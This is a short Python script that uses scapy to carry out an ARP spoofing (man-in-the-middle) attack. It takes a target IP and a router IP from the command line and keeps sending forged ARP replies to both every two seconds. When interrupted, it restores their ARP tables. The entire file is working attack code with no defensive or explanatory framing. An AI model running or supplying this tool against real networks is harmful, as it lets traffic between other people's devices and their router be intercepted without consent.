import  scapy.all as scapy
import time
import optparse as parse


# Getting target mac address/
def get_target_mac_address(ip):
        arp_request_packet = scapy.ARP(pdst=ip)
        broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Regex
        combained_packet = broadcast_packet / arp_request_packet
        answered_list = scapy.srp(combained_packet, timeout=1,verbose=False)[0]
        return answered_list[0][1].hwsrc


    #ARP POISONING THE TARGET
def arp_poisoning(target_ip,router_ip):
     target_mac_address = get_target_mac_address(target_ip)
     arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac_address,psrc=router_ip)
    #scapy.ls(scapy.ARP())
     scapy.sendp(arp_response,verbose=False)

    #Reset ARP Posioning operation
def reset_arp_posion_operation(target_ip, router_ip):
    target_mac_address = get_target_mac_address(target_ip)
    gateway_mac_address = get_target_mac_address(router_ip)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac_address, psrc=router_ip,hwsrc=gateway_mac_address)
    # scapy.ls(scapy.ARP())
    scapy.sendp(arp_response, verbose=False,count=5)

    # Getting user inout for automatize
def get_user_input():
    optparse_object = parse.OptionParser()
    optparse_object.add_option("-t","--target",dest="target_ip",help="Enter target ip address")
    optparse_object.add_option("-r", "--router", dest="router_ip", help="Enter router ip address")

    options = optparse_object.parse_args()[0]

    if not options.target_ip:
        print("Please enter a ip address")
    if not options.router_ip:
        print("Please enter a router ip address")

    return options

#Assigning user input to variables ( For access )
user_input_ips = get_user_input()
user_target_ip = user_input_ips.target_ip
user_router_ip = user_input_ips.router_ip

counter =0
try:
    while True:
        arp_poisoning(user_target_ip,user_router_ip)
        arp_poisoning(user_router_ip ,user_target_ip)
        counter +=2
        print("\r Sending pakets : " + str(counter),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nSuccessed Quit & Reset !")
    reset_arp_posion_operation(user_target_ip,user_router_ip)
    reset_arp_posion_operation(user_router_ip,user_target_ip)
